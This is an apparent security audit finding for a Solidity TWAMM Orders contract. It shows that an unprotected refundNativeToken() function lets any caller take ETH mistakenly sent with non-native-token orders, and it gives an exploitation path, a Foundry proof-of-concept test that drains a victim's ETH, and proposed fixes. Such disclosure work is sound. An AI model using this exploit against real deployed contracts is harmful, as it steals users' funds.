## Title
Unprotected `refundNativeToken()` Function Allows Theft of ETH Sent to Non-Native Token Orders

## Summary
The Orders contract inherits from `PayableMulticallable`, which provides a `refundNativeToken()` function with no access control that sends the entire ETH balance to `msg.sender`. When users mistakenly send ETH to non-native-token order functions (e.g., selling USDC), the ETH remains in the Orders contract balance and can be immediately stolen by any attacker calling `refundNativeToken()`.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `refundNativeToken()` function is intended to allow users to recover excess ETH they sent in multicall transactions for native token orders. The design assumes users will call this function themselves in the same transaction or immediately after to reclaim their own ETH.

**Actual Logic:** The function sends the **entire contract balance** to **msg.sender** without any access control or tracking of who originally sent the ETH. When ETH is sent to non-native-token order functions, it accumulates in the Orders contract and becomes claimable by anyone.

**Exploitation Path:**

1. **Victim sends ETH to non-native token order**: User calls [2](#0-1)  with `msg.value = 1 ETH` but the `orderKey` specifies a non-native token like USDC as the sell token.

2. **ETH remains in Orders contract**: In the internal `handleLockData()` function [3](#0-2) , the code checks if `sellToken == NATIVE_TOKEN_ADDRESS` (line 147). Since the sellToken is USDC (not address(0)), the condition is false, and line 150 executes `ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount))`, which transfers USDC from the user but leaves the 1 ETH sitting in the Orders contract.

3. **BaseLocker.lock() does not forward ETH**: The lock mechanism [4](#0-3)  explicitly calls `call(gas(), target, 0, ...)` with `0` as the value parameter (line 61), meaning no ETH is forwarded to the ACCOUNTANT during the lock callback.

4. **Attacker steals the ETH**: Any attacker (or MEV bot) monitors for transactions leaving ETH in the Orders contract and immediately calls `refundNativeToken()`, receiving the victim's 1 ETH.

**Security Property Broken:** Direct theft of user funds - violates the fundamental property that users should not lose assets due to honest mistakes when the protocol has mechanisms to prevent such loss.

## Impact Explanation
- **Affected Assets**: Any ETH mistakenly sent by users to non-native-token order functions
- **Damage Severity**: Complete loss of the sent ETH amount for the victim; attacker gains 100% of the mistakenly sent ETH
- **User Impact**: Any user who accidentally includes ETH value when creating/modifying orders for non-native tokens (e.g., USDC/DAI orders). This is a common mistake when users interact with contracts having payable functions.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user or MEV bot monitoring mempool transactions
- **Preconditions**: 
  - User sends ETH to any payable Order function while specifying a non-native token order
  - Common scenarios: UI bugs, user confusion about which orders require ETH, programmatic interactions with incorrect msg.value
- **Execution Complexity**: Single transaction - attacker simply calls `refundNativeToken()` after observing ETH accumulation
- **Frequency**: Can occur with every mistaken ETH transfer; attackers can back-run victim transactions or front-run each other to claim accumulated ETH

## Recommendation

**Option 1: Remove refundNativeToken() from Orders contract**
Since Orders handles native tokens explicitly in `handleLockData()` by transferring them to the ACCOUNTANT, there's no legitimate reason for ETH to accumulate in the Orders contract. The `refundNativeToken()` function should not be exposed.

```solidity
// In src/Orders.sol, remove inheritance from PayableMulticallable:
// CURRENT (vulnerable):
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {

// FIXED:
contract Orders is IOrders, UsesCore, BaseLocker, BaseNonfungibleToken {
    // Implement multicall directly without the refund function
    // Or inherit from a base Multicallable without the refund mechanism
}
```

**Option 2: Track ETH sender and only allow original sender to refund**
If refunds are needed for multicall scenarios, implement proper access control:

```solidity
// Add to PayableMulticallable.sol:
mapping(address => uint256) private _ethBalances;

function refundNativeToken() external payable {
    uint256 refundable = _ethBalances[msg.sender];
    if (refundable != 0) {
        _ethBalances[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundable);
    }
}

// Track deposits in receive() or in payable functions
```

**Option 3: Revert on non-native token orders with msg.value**
Prevent users from sending ETH to non-native token orders:

```solidity
// In src/Orders.sol, handleLockData():
if (callType == CALL_TYPE_CHANGE_SALE_RATE) {
    // ... existing code ...
    
    if (amount != 0) {
        address sellToken = orderKey.sellToken();
        if (saleRateDelta > 0) {
            // FIXED: Revert if ETH sent but token is not native
            if (sellToken != NATIVE_TOKEN_ADDRESS && msg.value != 0) {
                revert EthSentToNonNativeTokenOrder();
            }
            
            if (sellToken == NATIVE_TOKEN_ADDRESS) {
                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
            } else {
                ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
            }
        }
        // ... rest of code
    }
}
```

## Proof of Concept

```solidity
// File: test/Exploit_RefundNativeTokenTheft.t.sol
// Run with: forge test --match-test test_StealETHFromNonNativeOrders -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "./Orders.t.sol";
import "../src/Orders.sol";
import {createOrderConfig} from "../src/types/orderConfig.sol";
import {OrderKey} from "../src/types/orderKey.sol";
import {nextValidTime} from "../src/math/time.sol";

contract Exploit_RefundNativeTokenTheft is BaseOrdersTest {
    address victim = address(0x1234);
    address attacker = address(0x5678);

    function setUp() public override {
        BaseOrdersTest.setUp();
        
        // Give victim some ETH and tokens
        vm.deal(victim, 10 ether);
        token0.transfer(victim, 1000e18);
        
        // Give attacker some ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function test_StealETHFromNonNativeOrders() public {
        // Setup: Create a pool for non-native tokens (token0/token1, not ETH)
        uint64 fee = uint64((uint256(5) << 64) / 100);
        PoolKey memory poolKey = createTwammPool({fee: fee, tick: 0});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 10000, 10000);
        
        // Victim approves Orders contract
        vm.startPrank(victim);
        token0.approve(address(orders), type(uint256).max);
        
        uint64 startTime = uint64(nextValidTime(block.timestamp, block.timestamp));
        uint64 endTime = uint64(nextValidTime(block.timestamp, startTime));
        vm.warp(startTime);
        
        OrderKey memory key = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({_fee: fee, _isToken1: false, _startTime: startTime, _endTime: endTime})
        });
        
        // EXPLOIT: Victim mistakenly sends 1 ETH when creating non-native token order
        uint256 victimBalanceBefore = victim.balance;
        orders.mintAndIncreaseSellAmount{value: 1 ether}(key, 100, type(uint112).max);
        vm.stopPrank();
        
        // Verify victim lost 1 ETH (sent to Orders contract)
        assertEq(victim.balance, victimBalanceBefore - 1 ether, "Victim should have lost 1 ETH");
        assertEq(address(orders).balance, 1 ether, "Orders contract should have 1 ETH");
        
        // ATTACK: Attacker sees the ETH and steals it
        vm.prank(attacker);
        uint256 attackerBalanceBefore = attacker.balance;
        orders.refundNativeToken();
        
        // VERIFY: Attacker successfully stole victim's ETH
        assertEq(attacker.balance, attackerBalanceBefore + 1 ether, "Attacker should have gained 1 ETH");
        assertEq(address(orders).balance, 0, "Orders contract should be drained");
        assertEq(victim.balance, victimBalanceBefore - 1 ether, "Victim permanently lost 1 ETH");
    }
}
```

## Notes

The vulnerability exists because:

1. **All Orders functions are payable** [5](#0-4)  to support native token (ETH) orders where `sellToken == NATIVE_TOKEN_ADDRESS` (address(0)).

2. **Native token handling is conditional** - only when `sellToken == NATIVE_TOKEN_ADDRESS` does the code transfer ETH to the ACCOUNTANT [6](#0-5) . For non-native tokens, ETH is ignored and accumulates.

3. **The refund mechanism has no access control** - it was designed for users to recover their own excess ETH in multicall scenarios, but the implementation allows anyone to claim all accumulated ETH [1](#0-0) .

4. **No ETH accounting corruption occurs** - The FlashAccountant's delta accounting is not corrupted because ETH never reaches it in the non-native token case. The ETH simply sits in the Orders contract balance, making it a pure theft vector rather than an accounting corruption issue.

The answer to the original question: **The ETH is not permanently locked, nor does it corrupt delta accounting - instead, it becomes immediately stealable by any attacker through the unprotected `refundNativeToken()` function.**

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Orders.sol (L43-49)
```text
    function mintAndIncreaseSellAmount(OrderKey memory orderKey, uint112 amount, uint112 maxSaleRate)
        public
        payable
        returns (uint256 id, uint112 saleRate)
    {
        id = mint();
        saleRate = increaseSellAmount(id, orderKey, amount, maxSaleRate);
```

**File:** src/Orders.sol (L53-74)
```text
    function increaseSellAmount(uint256 id, OrderKey memory orderKey, uint128 amount, uint112 maxSaleRate)
        public
        payable
        authorizedForNft(id)
        returns (uint112 saleRate)
    {
        uint256 realStart = FixedPointMathLib.max(block.timestamp, orderKey.config.startTime());

        unchecked {
            if (orderKey.config.endTime() <= realStart) {
                revert OrderAlreadyEnded();
            }

            saleRate = uint112(computeSaleRate(amount, uint32(orderKey.config.endTime() - realStart)));

            if (saleRate > maxSaleRate) {
                revert MaxSaleRateExceeded();
            }
        }

        lock(abi.encode(CALL_TYPE_CHANGE_SALE_RATE, msg.sender, id, orderKey, saleRate));
    }
```

**File:** src/Orders.sol (L134-175)
```text
    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory result) {
        uint256 callType = abi.decode(data, (uint256));

        if (callType == CALL_TYPE_CHANGE_SALE_RATE) {
            (, address recipientOrPayer, uint256 id, OrderKey memory orderKey, int256 saleRateDelta) =
                abi.decode(data, (uint256, address, uint256, OrderKey, int256));

            int256 amount =
                CORE.updateSaleRate(TWAMM_EXTENSION, bytes32(id), orderKey, SafeCastLib.toInt112(saleRateDelta));

            if (amount != 0) {
                address sellToken = orderKey.sellToken();
                if (saleRateDelta > 0) {
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
                    } else {
                        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
                    }
                } else {
                    unchecked {
                        // we know amount will never exceed the uint128 type because of limitations on sale rate (fixed point 80.32) and duration (uint32)
                        ACCOUNTANT.withdraw(sellToken, recipientOrPayer, uint128(uint256(-amount)));
                    }
                }
            }

            result = abi.encode(amount);
        } else if (callType == CALL_TYPE_COLLECT_PROCEEDS) {
            (, uint256 id, OrderKey memory orderKey, address recipient) =
                abi.decode(data, (uint256, uint256, OrderKey, address));

            uint128 proceeds = CORE.collectProceeds(TWAMM_EXTENSION, bytes32(id), orderKey);

            if (proceeds != 0) {
                ACCOUNTANT.withdraw(orderKey.buyToken(), recipient, proceeds);
            }

            result = abi.encode(proceeds);
        } else {
            revert();
        }
    }
```

**File:** src/base/BaseLocker.sol (L44-73)
```text
    function lock(bytes memory data) internal returns (bytes memory result) {
        address target = address(ACCOUNTANT);

        assembly ("memory-safe") {
            // We will store result where the free memory pointer is now, ...
            result := mload(0x40)

            // But first use it to store the calldata

            // Selector of lock()
            mstore(result, shl(224, 0xf83d08ba))

            // We only copy the data, not the length, because the length is read from the calldata size
            let len := mload(data)
            mcopy(add(result, 4), add(data, 32), len)

            // If the call failed, pass through the revert
            if iszero(call(gas(), target, 0, result, add(len, 4), 0, 0)) {
                returndatacopy(result, 0, returndatasize())
                revert(result, returndatasize())
            }

            // Copy the entire return data into the space where the result is pointing
            mstore(result, returndatasize())
            returndatacopy(add(result, 32), 0, returndatasize())

            // Update the free memory pointer to be after the end of the data, aligned to the next 32 byte word
            mstore(0x40, and(add(add(result, add(32, returndatasize())), 31), not(31)))
        }
    }
```
